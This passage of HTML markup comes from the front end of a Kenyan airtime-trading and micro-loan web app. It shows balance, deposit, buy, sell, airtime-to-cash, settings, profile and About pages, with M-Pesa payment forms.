                    <div class="card balance-card" style="background: linear-gradient(145deg, #1a5f2a 0%, #0d4a1f 50%, #083314 100%); border: none; border-radius: 16px; padding: 15px; position: relative; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.25); margin-top: 0;">
                        <!-- Balance Header Row -->
                        <div style="display: flex; align-items: center; justify-content: space-between; position: relative; z-index: 1;">
                            <div style="display: flex; align-items: center; gap: 10px;">
                                <div style="width: 36px; height: 36px; background: linear-gradient(135deg, #f4a020, #e67e22); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
                                    <i class="fas fa-wallet" style="color: #fff; font-size: 1rem;"></i>
                                </div>
                                <p style="font-size: 0.75rem; color: rgba(255,255,255,0.8); margin: 0;">Airtime Float Balance</p>
                            </div>
                            <p class="balance-value" id="dashboardBalance" style="font-size: 1.5rem; font-weight: 700; color: #fff; margin: 0;">KES 0.00</p>
                        </div>
                        
                        <!-- Bonus banner -->
                        <div style="background: rgba(244, 160, 32, 0.15); border-radius: 8px; padding: 8px 12px; margin-top: 12px; position: relative; z-index: 1;">
                            <p style="margin: 0; font-size: 0.8rem; color: #fff; display: flex; align-items: center; justify-content: center; gap: 6px;">
                                <i class="fas fa-gift" style="color: #f4a020;"></i>
                                <span>Deposit KES 50+ Get <strong style="color: #f4a020;">KES 6 Bonus!</strong></span>
                            </p>
                        </div>
                    </div>

                    <div class="quick-actions-grid" style="gap: 15px;">
                        <button class="action-card" onclick="showPage('deposit')" style="padding: 22px 15px; border-radius: 20px; border: 2px solid rgba(255,255,255,0.15);">
                            <i class="fas fa-wallet" style="font-size: 2rem;"></i>
                            <span data-translate="deposit" style="font-weight: 700;">Deposit Airtime Float</span>
                        </button>
                        <button class="action-card" onclick="showPage('buy-airtime')" style="padding: 22px 15px; border-radius: 20px; border: 2px solid rgba(255,255,255,0.15);">
                            <i class="fas fa-mobile-alt" style="font-size: 2rem;"></i>
                            <span data-translate="buyAirtime" style="font-weight: 700;">Buy Airtime</span>
                        </button>
                        <button class="action-card" onclick="showPage('airtime-to-cash')" style="padding: 22px 15px; border-radius: 20px; border: 2px solid rgba(255,255,255,0.15);">
                            <i class="fas fa-exchange-alt" style="font-size: 2rem;"></i>
                            <span data-translate="airtimeToCash" style="font-weight: 700;">Airtime to Cash</span>
                        </button>
                        <button class="action-card" onclick="showPage('transactions')" style="padding: 22px 15px; border-radius: 20px; border: 2px solid rgba(255,255,255,0.15);">
                            <i class="fas fa-history" style="font-size: 2rem;"></i>
                            <span data-translate="history" style="font-weight: 700;">History</span>
                        </button>
                    </div>

                    <!-- Separate Full Width Action Buttons -->
                    <div style="display: flex; flex-direction: column; gap: 12px; margin-top: 15px;">
                        <button class="action-card" onclick="scrollToDirectBuy()" style="background: linear-gradient(135deg, rgba(244, 160, 32, 0.25), rgba(230, 126, 34, 0.35)); padding: 18px 20px; border-radius: 16px; border: 2px solid rgba(244, 160, 32, 0.4); flex-direction: row; justify-content: center;">
                            <i class="fas fa-bolt" style="font-size: 1.5rem; margin-right: 12px;"></i>
                            <span style="font-weight: 700;">Buy Airtime Directly (Quick buy with or without account)</span>
                        </button>
                        <button class="action-card loan-feature" onclick="openLoanTerms()" style="background: linear-gradient(135deg, rgba(46, 204, 113, 0.25), rgba(39, 174, 96, 0.35)); padding: 18px 20px; border-radius: 16px; border: 2px solid rgba(46, 204, 113, 0.4); flex-direction: row; justify-content: center;">
                            <i class="fas fa-hand-holding-usd" style="font-size: 1.5rem; margin-right: 12px;"></i>
                            <span style="font-weight: 700;">Get Loan Now</span>
                        </button>
                    </div>

                </div>

                <div class="page-content">
                <button class="pwa-install" id="pwaInstall" onclick="installPWA()" title="Install App">
                    <p>Ease airtime purchase by installing app</p>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play" style="height: 40px; width: auto;">
                </button>

                <!-- Promo Banner Section -->
                <div class="card promo-banner-card" style="margin-top: 20px; padding: 0; overflow: hidden;">
                    <img src="airtime-solution2.png" alt="Quick pay solution Promo" style="width: 100%; height: auto; display: block; border-radius: 16px 16px 0 0;">
                    <div style="padding: 20px; text-align: center;">
                        <h3 style="font-size: 1.2rem; color: var(--primary); margin-bottom: 10px; font-weight: 700;">Your Trusted Airtime Partner</h3>
                        <p style="font-size: 0.9rem; color: var(--gray); line-height: 1.6;">Buy, sell, and manage airtime effortlessly. Fast transactions, secure payments, and unbeatable rates for all networks.Also you can access loans of upto Ksh 15,000 with low interest rates and</p>
                    </div>
                </div>

                <!-- Scrolling Announcement -->
                <div class="scrolling-text-container" style="margin-top: 15px;">
                    <div class="scrolling-text">
                        ðŸ“¢ IMPORTANT UPDATE: Enjoy instant airtime delivery! Deposit KES 50+ and get KES 6 bonus! ðŸ’° LOANS NOW AVAILABLE: Get up to KES 15,000 instantly! Quick approval in minutes! ðŸŽ¯ New features coming soon! 24/7 Support available! Buy airtime directly without an account - just pay via M-Pesa! All networks supported: Safaricom, Airtel, Telkom! ðŸ’³ Low interest rates from 1.5%! Flexible repayment up to 100 days! Fast, secure, and reliable service! Apply for a loan today! ðŸŽ‰
                    </div>
                </div>

                <!-- Direct Buy Section -->
                <div class="card" id="directBuySection" style="margin-top: 20px; border: 2px solid var(--secondary); background: linear-gradient(135deg, rgba(244, 160, 32, 0.05), rgba(255, 255, 255, 1));">
                    <h3 class="card-title" style="color: var(--secondary);"><i class="fas fa-bolt"></i> Buy Airtime Directly (No Account Needed)</h3>
                    
                    <div class="info-box" style="background: rgba(244, 160, 32, 0.1); border-left-color: var(--secondary);">
                        <p><i class="fas fa-info-circle"></i> Purchase airtime instantly via M-Pesa STK Push. No registration required! Works for all networks.</p>
                    </div>

                    <form id="directBuyForm" onsubmit="event.preventDefault(); initiateDirectBuy();">
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-phone"></i> Phone to Receive Airtime *</label>
                            <div class="phone-wrapper">
                                <span class="phone-prefix">+254</span>
                                <input type="tel" class="form-input" id="directBuyPhone" placeholder="7XXXXXXXX" maxlength="9" required oninput="validateDirectPhone()">
                            </div>
                            <p class="validation-error" id="directPhoneError" style="display: none;">Enter a valid 9-digit phone number starting with 7 or 1</p>
                        </div>

                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-signal"></i> Select Network To receive airtime*âœ…ï¸âœ…ï¸</label>
                            <div class="network-selector" id="directNetworkSelector">
                                <div class="network-option" data-network="safaricom" onclick="selectDirectNetwork('safaricom')">
                                    <img src="safaricom.png" alt="Safaricom" onerror="this.src='https://via.placeholder.com/50x50/4CB05B/ffffff?text=SAF'">
                                    <span>Safaricom</span>
                                </div>
                                <div class="network-option" data-network="airtel" onclick="selectDirectNetwork('airtel')">
                                    <img src="airtel.png" alt="Airtel" onerror="this.src='https://via.placeholder.com/50x50/ED1C24/ffffff?text=AIR'">
                                    <span>Airtel</span>
                                </div>
                                <div class="network-option" data-network="telcom" onclick="selectDirectNetwork('telcom')">
                                    <img src="telcom.png" alt="Telcom" onerror="this.src='https://via.placeholder.com/50x50/0066B3/ffffff?text=TEL'">
                                    <span>Telcom</span>
                                </div>
                            </div>
                            <p class="network-error" id="directNetworkError" style="display: none;">Please select a network</p>
                            <input type="hidden" id="selectedDirectNetwork" value="">
                        </div>

                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-money-bill"></i> Amount (KES) *</label>
                            <input type="number" class="form-input" id="directBuyAmount" placeholder="Minimum: 10" min="10" required oninput="validateDirectAmount()">
                            <p class="validation-error" id="directAmountError" style="display: none;">Minimum amount is KES 10</p>
                            <div style="display: flex; gap: 8px; margin-top: 10px; flex-wrap: wrap;">
                                <button type="button" class="btn btn-outline" style="flex: 1; min-width: 60px; padding: 10px;" onclick="document.getElementById('directBuyAmount').value = 10; validateDirectAmount();">10</button>
                                <button type="button" class="btn btn-outline" style="flex: 1; min-width: 60px; padding: 10px;" onclick="document.getElementById('directBuyAmount').value = 20; validateDirectAmount();">20</button>
                                <button type="button" class="btn btn-outline" style="flex: 1; min-width: 60px; padding: 10px;" onclick="document.getElementById('directBuyAmount').value = 50; validateDirectAmount();">50</button>
                                <button type="button" class="btn btn-outline" style="flex: 1; min-width: 60px; padding: 10px;" onclick="document.getElementById('directBuyAmount').value = 100; validateDirectAmount();">100</button>
                                <button type="button" class="btn btn-outline" style="flex: 1; min-width: 60px; padding: 10px;" onclick="document.getElementById('directBuyAmount').value = 200; validateDirectAmount();">200</button>
                                <button type="button" class="btn btn-outline" style="flex: 1; min-width: 60px; padding: 10px;" onclick="document.getElementById('directBuyAmount').value = 500; validateDirectAmount();">500</button>
                            </div>
                        </div>

                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-mobile-alt"></i> Phone to Pay With (M-Pesa) *</label>
                            <div class="phone-wrapper">
                                <span class="phone-prefix">+254</span>
                                <input type="tel" class="form-input" id="directPayPhone" placeholder="7XXXXXXXX" maxlength="9" required oninput="validateDirectPayPhone()">
                            </div>
                            <p class="validation-error" id="directPayPhoneError" style="display: none;">Enter a valid Safaricom number starting with 7 or 1</p>
                            <p style="font-size: 0.8rem; color: var(--gray); margin-top: 5px;"><i class="fas fa-info-circle"></i> STK Push will be sent to this number</p>
                        </div>

                        <button type="submit" class="btn btn-secondary" id="directBuyBtn" disabled style="font-size: 1.1rem; padding: 16px;">
                            <i class="fas fa-bolt"></i> Buy Now via M-Pesa
                        </button>

                        <div id="directBuyStatus" style="margin-top: 15px; text-align: center; display: none;">
                            <span class="live-indicator"></span>
                            <span id="directBuyStatusText">Processing...</span>
                        </div>
                    </form>
                </div>

                <!-- Why Choose Us Section -->
                <div class="card" style="margin-top: 20px;">
                    <h3 class="card-title"><i class="fas fa-star"></i> <span data-translate="whyChooseUs">Why Choose Us</span></h3>
                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
                        <div style="text-align: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fas fa-bolt" style="font-size: 2rem; color: var(--secondary); margin-bottom: 10px;"></i>
                            <h4 style="font-size: 0.9rem; margin-bottom: 5px;">Instant Delivery</h4>
                            <p style="font-size: 0.8rem; color: var(--gray);">Airtime delivered in seconds</p>
                        </div>
                        <div style="text-align: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fas fa-shield-alt" style="font-size: 2rem; color: var(--success); margin-bottom: 10px;"></i>
                            <h4 style="font-size: 0.9rem; margin-bottom: 5px;">Secure Payments</h4>
                            <p style="font-size: 0.8rem; color: var(--gray);">M-Pesa powered security</p>
                        </div>
                        <div style="text-align: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fas fa-percentage" style="font-size: 2rem; color: var(--primary); margin-bottom: 10px;"></i>
                            <h4 style="font-size: 0.9rem; margin-bottom: 5px;">Best Rates</h4>
                            <p style="font-size: 0.8rem; color: var(--gray);">Competitive discounts</p>
                        </div>
                        <div style="text-align: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fas fa-headset" style="font-size: 2rem; color: var(--info); margin-bottom: 10px;"></i>
                            <h4 style="font-size: 0.9rem; margin-bottom: 5px;">24/7 Support</h4>
                            <p style="font-size: 0.8rem; color: var(--gray);">Always here to help</p>
                        </div>
                    </div>
                </div>

                <!-- Platform Usage Graph -->
                <div class="users-graph-card" style="margin-top: 20px;">
                    <h3 class="card-title"><i class="fas fa-chart-bar"></i> Platform Activity</h3>
                    <p style="font-size: 0.85rem; color: var(--gray); margin-bottom: 15px;">Users buying airtime this week</p>
                    <div class="graph-container" style="margin-bottom: 30px;">
                        <div class="graph-bar" style="height: 65%;" data-value="1.2K"><span>Mon</span></div>
                        <div class="graph-bar" style="height: 80%;" data-value="1.8K"><span>Tue</span></div>
                        <div class="graph-bar" style="height: 55%;" data-value="950"><span>Wed</span></div>
                        <div class="graph-bar" style="height: 90%;" data-value="2.1K"><span>Thu</span></div>
                        <div class="graph-bar" style="height: 75%;" data-value="1.5K"><span>Fri</span></div>
                        <div class="graph-bar" style="height: 60%;" data-value="1.1K"><span>Sat</span></div>
                        <div class="graph-bar" style="height: 85%;" data-value="1.9K"><span>Sun</span></div>
                    </div>
                    <div style="display: flex; justify-content: space-around; text-align: center; padding-top: 10px; border-top: 1px solid var(--border);">
                        <div>
                            <p style="font-size: 1.5rem; font-weight: 700; color: var(--primary);">10.5K</p>
                            <p style="font-size: 0.75rem; color: var(--gray);">Weekly Users</p>
                        </div>
                        <div>
                            <p style="font-size: 1.5rem; font-weight: 700; color: var(--success);">KES 100k+</p>
                            <p style="font-size: 0.75rem; color: var(--gray);">Airtime Sold</p>
                        </div>
                        <div>
                            <p style="font-size: 1.5rem; font-weight: 700; color: var(--secondary);">99.8%</p>
                            <p style="font-size: 0.75rem; color: var(--gray);">Success Rate</p>
                        </div>
                    </div>
                </div>

                <!-- FAQ Section -->
                <div class="card" style="margin-top: 20px;">
                    <h3 class="card-title"><i class="fas fa-question-circle"></i> <span data-translate="faq">Frequently Asked Questions</span></h3>
                    <div class="faq-item" style="margin-bottom: 15px; padding: 15px; background: var(--light); border-radius: 12px;">
                        <h4 style="font-size: 0.95rem; color: var(--primary); margin-bottom: 8px;"><i class="fas fa-chevron-right" style="margin-right: 8px;"></i>How do I buy airtime?</h4>
                        <p style="font-size: 0.85rem; color: var(--gray);">Simply deposit funds to your wallet, select a network, enter the phone number and amount, then click "Buy Now".</p>
                    </div>
                    <div class="faq-item" style="margin-bottom: 15px; padding: 15px; background: var(--light); border-radius: 12px;">
                        <h4 style="font-size: 0.95rem; color: var(--primary); margin-bottom: 8px;"><i class="fas fa-chevron-right" style="margin-right: 8px;"></i>How long does airtime delivery take?</h4>
                        <p style="font-size: 0.85rem; color: var(--gray);">Airtime is delivered instantly within 5-30 seconds after successful payment.</p>
                    </div>
                    <div class="faq-item" style="margin-bottom: 15px; padding: 15px; background: var(--light); border-radius: 12px;">
                        <h4 style="font-size: 0.95rem; color: var(--primary); margin-bottom: 8px;"><i class="fas fa-chevron-right" style="margin-right: 8px;"></i>What is the minimum deposit?</h4>
                        <p style="font-size: 0.85rem; color: var(--gray);">The minimum deposit is KES 10. Deposits of KES 50 or more receive a KES 6 bonus!</p>
                    </div>
                    <div class="faq-item" style="padding: 15px; background: var(--light); border-radius: 12px;">
                        <h4 style="font-size: 0.95rem; color: var(--primary); margin-bottom: 8px;"><i class="fas fa-chevron-right" style="margin-right: 8px;"></i>Which networks are supported?</h4>
                        <p style="font-size: 0.85rem; color: var(--gray);">We support Safaricom, Airtel, and Telkom Kenya networks.</p>
                    </div>
                </div>

                <div class="card" style="margin-top: 20px;">
                    <h3 class="card-title"><i class="fas fa-clock"></i> <span data-translate="recentTransactions">Recent Transactions</span></h3>
                    <div class="transaction-list" id="recentTransactions">
                        <div class="empty-state">
                            <i class="fas fa-inbox"></i>
                            <h3>No transactions yet</h3>
                            <p>Your recent transactions will appear here</p>
                        </div>
                    </div>
                </div>

                <div class="footer-links">
                    <span class="footer-link" onclick="showPage('about')">About</span>
                    <span class="footer-link" onclick="showPage('contact')">Contact</span>
                    <span class="footer-link" onclick="showPage('privacy')">Privacy</span>
                    <span class="footer-link" onclick="showPage('terms')">Terms</span>
                </div>
                </div>
            </div>

            <div id="page-deposit" class="page">
                <div class="card">
                    <h3 class="card-title"><i class="fas fa-wallet"></i> Deposit Money</h3>

                    <div class="info-box">
                        <p><i class="fas fa-gift"></i> Deposit KES 50+ and get <strong>+6 bonus</strong> added to your account!</p>
                    </div>

                    <form id="depositForm">
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-phone"></i> Phone Number *</label>
                            <input type="tel" class="form-input" id="depositPhone" placeholder="e.g. 0732202740" maxlength="10" required>
                            <small style="color: var(--gray); font-size: 0.8rem;">Enter your M-Pesa number (starts with 07 or 01)</small>
                        </div>

                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-money-bill"></i> Amount (KES) *</label>
                            <input type="number" class="form-input" id="depositAmount" placeholder="Minimum: 10" min="10" required>
                        </div>

                        <div class="btn-group">
                            <button type="submit" class="btn btn-primary" id="depositStkBtn">
                                <i class="fas fa-mobile-alt"></i> Deposit via M-Pesa STK Push
                            </button>

                            <div class="divider-text"><span>OR</span></div>

                            <button type="button" class="btn btn-link" onclick="depositWithLink()">
                                <i class="fas fa-link"></i> Deposit with Payment Link
                            </button>
                        </div>

                        <button type="button" class="retry-btn" id="retryDepositBtn" onclick="retryDeposit()">
                            <i class="fas fa-sync-alt"></i> Retry Deposit
                        </button>

                        <div id="depositStatus" style="margin-top: 15px; text-align: center; display: none;">
                            <span class="live-indicator"></span>
                            <span id="depositStatusText">Processing...</span>
                        </div>
                    </form>
                </div>
            </div>

            <div id="page-buy-airtime" class="page">
                <div class="card">
                    <h3 class="card-title"><i class="fas fa-mobile-alt"></i> Buy Airtime</h3>

                    <div class="info-box">
                        <p><i class="fas fa-info-circle"></i> Buy KES 20 and above and receive extra Commissions  directly to your account Float balance. Minimum purchase: KES 10</p>
                    </div>

                    <form id="buyAirtimeForm">
                        <!-- Network Selection -->
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-signal"></i> Select Network *âœ…ï¸âœ…ï¸ </label>
                            <div class="network-selector">
                                <div class="network-option" data-network="safaricom" onclick="selectNetwork('safaricom')">
                                    <img src="safaricom.png" alt="Safaricom" onerror="this.src='https://via.placeholder.com/50x50/4CB05B/ffffff?text=SAF'">
                                    <span>Safaricom</span>
                                </div>
                                <div class="network-option" data-network="airtel" onclick="selectNetwork('airtel')">
                                    <img src="airtel.png" alt="Airtel" onerror="this.src='https://via.placeholder.com/50x50/ED1C24/ffffff?text=AIR'">
                                    <span>Airtel</span>
                                </div>
                                <div class="network-option" data-network="telcom" onclick="selectNetwork('telcom')">
                                    <img src="telcom.png" alt="Telcom" onerror="this.src='https://via.placeholder.com/50x50/0066B3/ffffff?text=TEL'">
                                    <span>Telcom</span>
                                </div>
                            </div>
                            <p class="network-error" id="networkError">Please select a network to continue</p>
                            <input type="hidden" id="selectedNetwork" value="">
                        </div>

                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-phone"></i> Phone Number *</label>
                            <div class="phone-wrapper">
                                <span class="phone-prefix">+254</span>
                                <input type="tel" class="form-input" id="airtimePhone" placeholder="7XXXXXXXX" maxlength="9" required oninput="validateAirtimePhone()">
                            </div>
                            <p class="validation-error" id="phoneError">Enter a valid 9-digit phone number starting with 7 or 1</p>
                        </div>

                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-money-bill"></i> Amount (KES) *</label>
                            <input type="number" class="form-input" id="airtimeAmount" placeholder="Minimum: 10" min="10" required oninput="validateAirtimeAmount()">
                            <p class="validation-error" id="amountError">Minimum amount is KES 10</p>
                        </div>

                        <div class="btn-group" style="display: flex; gap: 10px; flex-wrap: wrap;">
                            <button type="submit" class="btn btn-primary" id="buyAirtimeBtn" disabled style="flex: 1;">
                                <i class="fas fa-shopping-cart"></i> Buy Now (From Balance)
                            </button>

                            <button type="button" class="btn btn-outline" onclick="goToDirectBuyFromBuyPage()" style="flex: 1; border-color: var(--secondary); color: var(--secondary);">
                                <i class="fas fa-bolt"></i> Buy With mpesa stk push
                            </button>
                        </div>
                    </form>
                </div>
            </div>

            <div id="page-sell-airtime" class="page">
                <div class="card">
                    <h3 class="card-title"><i class="fas fa-gift"></i> Sell Airtime Get Extra Commission</h3>

                    <div class="info-box">
                        <p><i class="fas fa-info-circle"></i> Sell airtime and earn commission! KES 10-49 = 5% commission, KES 50+ = 10% commission. Minimum Sell: KES 10</p>
                    </div>

                    <form id="sellAirtimeForm">
                        <!-- Network Selection -->
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-signal"></i> Select Network *âœ…ï¸âœ…ï¸ </label>
                            <div class="network-selector">
                                <div class="network-option" data-network="safaricom" data-form="send" onclick="selectSendNetwork('safaricom')">
                                    <img src="safaricom.png" alt="Safaricom" onerror="this.src='https://via.placeholder.com/50x50/4CB05B/ffffff?text=SAF'">
                                    <span>Safaricom</span>
                                </div>
                                <div class="network-option" data-network="airtel" data-form="send" onclick="selectSendNetwork('airtel')">
                                    <img src="airtel.png" alt="Airtel" onerror="this.src='https://via.placeholder.com/50x50/ED1C24/ffffff?text=AIR'">
                                    <span>Airtel</span>
                                </div>
                                <div class="network-option" data-network="telcom" data-form="send" onclick="selectSendNetwork('telcom')">
                                    <img src="telcom.png" alt="Telcom" onerror="this.src='https://via.placeholder.com/50x50/0066B3/ffffff?text=TEL'">
                                    <span>Telcom</span>
                                </div>
                            </div>
                            <p class="network-error" id="sendNetworkError">Please select a network to continue</p>
                            <input type="hidden" id="selectedSendNetwork" value="">
                        </div>

                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-phone"></i> Phone Number to Sell Airtime *</label>
                            <div class="phone-wrapper">
                                <span class="phone-prefix">+254</span>
                                <input type="tel" class="form-input" id="sellAirtimePhone" placeholder="7XXXXXXXX" maxlength="9" required oninput="validateSendPhone()">
                            </div>
                            <p class="validation-error" id="sendPhoneError">Enter a valid 9-digit phone number starting with 7 or 1</p>
                        </div>

                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-money-bill"></i> Airtime Amount (KES) *</label>
                            <input type="number" class="form-input" id="sellAirtimeAmount" placeholder="Minimum: 10" min="10" required oninput="validateSendAmount()">
                            <p class="validation-error" id="sendAmountError">Minimum amount is KES 10</p>
                        </div>

                        <div class="btn-group">
                            <button type="submit" class="btn btn-primary" id="sellAirtimeBalanceBtn" disabled>
                                <i class="fas fa-wallet"></i> Sell from Balance
                            </button>
                        </div>
                    </form>
                </div>

                <div class="card" style="margin-top: 15px;">
                    <h3 class="card-title"><i class="fas fa-chart-line"></i> Service Status</h3>
                    <div id="statumFloatStatus">
                        <p style="color: var(--gray);">Checking service availability...</p>
                    </div>
                </div>
            </div>

            <div id="page-airtime-to-cash" class="page">
                <div class="card" style="position: relative;">
                    <div class="coming-soon-overlay" id="a2cOverlay">
                        <div class="coming-soon-badge">
                            <i class="fas fa-clock"></i>
                            Coming Soon!
                        </div>
                    </div>

                    <h3 class="card-title"><i class="fas fa-exchange-alt"></i> Airtime to Cash</h3>

                    <div class="rate-display">
                        <p>Conversion Rate</p>
                        <p class="rate">80% Cashback</p>
                        <p style="font-size: 0.85rem;">KES 100 Airtime = KES 80 Cash</p>
                    </div>

                    <form id="airtimeToCashForm">
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-coins"></i> Airtime Amount to Convert *</label>
                            <input type="number" class="form-input" id="a2cAmount" placeholder="Enter amount" min="10" required>
                        </div>

                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-phone"></i> Your Phone Number *</label>
                            <div class="phone-wrapper">
                                <span class="phone-prefix">+254</span>
                                <input type="tel" class="form-input" id="a2cPhone" placeholder="7XXXXXXXX" maxlength="9" required>
                            </div>
                        </div>

                        <div id="dialCodeSection" style="display: none;">
                            <p style="margin-bottom: 10px;">Dial this code to send airtime:</p>
                            <div class="dial-code" id="dialCode">*140*100*0732202740#</div>
                            <p style="font-size: 0.85rem; color: var(--gray); margin-bottom: 15px;">After sending, click "Done" below</p>
                        </div>

                        <div class="btn-group">
                            <button type="submit" class="btn btn-primary" id="sambazaBtn">
                                <i class="fas fa-paper-plane"></i> Generate Dial Code
                            </button>
                            <button type="button" class="btn btn-secondary" id="doneBtn" style="display: none;" onclick="showVerifyA2C()">
                                <i class="fas fa-check"></i> Done - I've Sent Airtime
                            </button>
                        </div>
                    </form>
                </div>
            </div>

            <div id="page-verify-a2c" class="page">
                <div class="card">
                    <h3 class="card-title"><i class="fas fa-check-circle"></i> Verify Airtime Sent</h3>
                    <p style="margin-bottom: 20px; color: var(--gray);">Enter the confirmation message code from Safaricom to verify your transfer.</p>
                    <form id="verifyA2CForm">
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-phone"></i> Your Phone Number</label>
                            <input type="text" class="form-input" id="verifyA2CPhone" readonly>
                        </div>
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-key"></i> Confirmation Code *</label>
                            <input type="text" class="form-input" id="verifyA2CCode" placeholder="Enter confirmation code" required>
                        </div>
                        <button type="submit" class="btn btn-primary">
                            <i class="fas fa-check"></i> Verify
                        </button>
                    </form>
                </div>
            </div>

            <div id="page-transactions" class="page">
                <div class="card">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <h3 class="card-title" style="margin: 0;"><i class="fas fa-history"></i> Transaction History</h3>
                        <button class="btn btn-outline" style="width: auto; padding: 10px 15px;" onclick="downloadTransactionsPDF()">
                            <i class="fas fa-download"></i> PDF
                        </button>
                    </div>
                    <div class="transaction-list" id="allTransactions">
                        <div class="empty-state">
                            <i class="fas fa-inbox"></i>
                            <h3>No transactions</h3>
                            <p>Your transaction history will appear here</p>
                        </div>
                    </div>
                </div>
            </div>

            <div id="page-verify-deposit" class="page">
                <div class="card">
                    <h3 class="card-title"><i class="fas fa-check-circle"></i> Verify Deposit</h3>
                    <p style="margin-bottom: 20px; color: var(--gray);">If your deposit was successful but not reflected, enter your M-Pesa code to verify.</p>
                    <form id="verifyDepositForm">
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-receipt"></i> M-Pesa Transaction Code *</label>
                            <input type="text" class="form-input" id="mpesaCode" placeholder="e.g., ABC123XYZ" required>
                        </div>
                        <button type="submit" class="btn btn-primary" id="verifyDepositBtn">
                            <i class="fas fa-search"></i> Verify Deposit
                        </button>
                    </form>
                </div>
            </div>

            <div id="page-bulk-sms" class="page">
                <div class="card" style="position: relative;">
                    <div class="coming-soon-overlay">
                        <div class="coming-soon-badge">
                            <i class="fas fa-clock"></i>
                            Coming Soon!
                        </div>
                    </div>
                    <h3 class="card-title"><i class="fas fa-sms"></i> Bulk SMS</h3>
                    <p>Send SMS to multiple recipients at affordable rates.</p>
                </div>
            </div>

            <div id="page-settings" class="page">
                <div class="card">
                    <h3 class="card-title"><i class="fas fa-cog"></i> Settings</h3>
                    <div class="form-group">
                        <label class="form-label"><i class="fas fa-language"></i> Language</label>
                        <select class="form-input" id="languageSelect" onchange="changeLanguage(this.value)">
                            <option value="en">English</option>
                            <option value="sw">Kiswahili</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label"><i class="fas fa-moon"></i> Theme</label>
                        <select class="form-input" id="themeSelect" onchange="changeTheme(this.value)">
                            <option value="light">Light Mode</option>
                            <option value="dark">Dark Mode</option>
                        </select>
                    </div>
                    <div class="menu-divider"></div>
                    <button class="btn btn-outline" onclick="showPage('profile')" style="margin-bottom: 10px;">
                        <i class="fas fa-user"></i> Edit Profile
                    </button>
                    <button class="btn btn-outline" onclick="showPage('cookies')">
                        <i class="fas fa-cookie"></i> Cookie Preferences
                    </button>
                </div>
            </div>

            <div id="page-profile" class="page">
                <div class="card">
                    <h3 class="card-title"><i class="fas fa-user"></i> My Profile</h3>
                    <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=airtimeuser&backgroundColor=b6e3f4" alt="Profile Avatar" class="profile-avatar">
                    <form id="profileForm">
                        <div class="form-group">
                            <label class="form-label">Email</label>
                            <input type="email" class="form-input" id="profileEmail" readonly>
                        </div>
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-phone"></i> Phone Number</label>
                            <div class="phone-wrapper">
                                <span class="phone-prefix">+254</span>
                                <input type="tel" class="form-input" id="profilePhone" maxlength="9" oninput="validateProfilePhone()">
                            </div>
                            <p class="validation-error" id="profilePhoneError">Enter a valid 9-digit phone number starting with 7 or 1</p>
                            <p class="validation-error" id="profilePhoneDuplicateError" style="color: var(--warning);">This phone number is already registered</p>
                        </div>
                        <button type="submit" class="btn btn-primary" id="profileSaveBtn">
                            <i class="fas fa-save"></i> Save Changes
                        </button>
                    </form>
                </div>
            </div>

            <div id="page-about" class="page">
                <div class="card">
                    <button class="btn btn-outline" onclick="history.back()" style="margin-bottom: 15px; width: auto; padding: 10px 20px;">
                        <i class="fas fa-arrow-left"></i> Back
                    </button>
                    <h3 class="card-title"><i class="fas fa-info-circle"></i> <span data-translate="aboutUs">About Us</span></h3>
                    
                    <div style="text-align: center; margin-bottom: 20px;">
                        <img src="about1.png" alt="Pesa Hub Kenya" style="max-width: 200px; border-radius: 16px; margin-bottom: 10px;" onerror="this.style.display='none'">
                    </div>
                    
                    <p style="margin-bottom: 15px; font-size: 1.05rem;"><strong>Pesahub Kenya</strong> is your trusted partner for buying and reselling airtime across all networks in Kenya, as well as accessing quick personal loans when you need them most.</p>
                    
                    <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
                        <h4 style="color: var(--primary); margin-bottom: 15px;"><i class="fas fa-bullseye" style="margin-right: 8px;"></i>Our Mission</h4>
                        <p style="color: var(--gray);">To provide Kenyans with the most convenient, affordable, and reliable airtime and financial services, empowering individuals and businesses to stay connected and financially secure.</p>
                    </div>
                    
                    <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
                        <h4 style="color: var(--primary); margin-bottom: 15px;"><i class="fas fa-eye" style="margin-right: 8px;"></i>Our Vision</h4>
                        <p style="color: var(--gray);">To become Kenya's leading digital airtime and micro-lending platform, known for innovation, trust, and exceptional customer service.</p>
                    </div>
                    
                    <p style="margin-bottom: 15px;">We provide a fast, secure, and reliable platform that allows you to:</p>
                    <ul style="margin-left: 20px; margin-bottom: 20px; line-height: 1.8;">
                        <li><i class="fas fa-check" style="color: var(--success); margin-right: 8px;"></i>Buy airtime instantly at discounted rates</li>
                        <li><i class="fas fa-check" style="color: var(--success); margin-right: 8px;"></i>Resell airtime and earn profits</li>
                        <li><i class="fas fa-check" style="color: var(--success); margin-right: 8px;"></i>Convert airtime to cash (Coming Soon)</li>
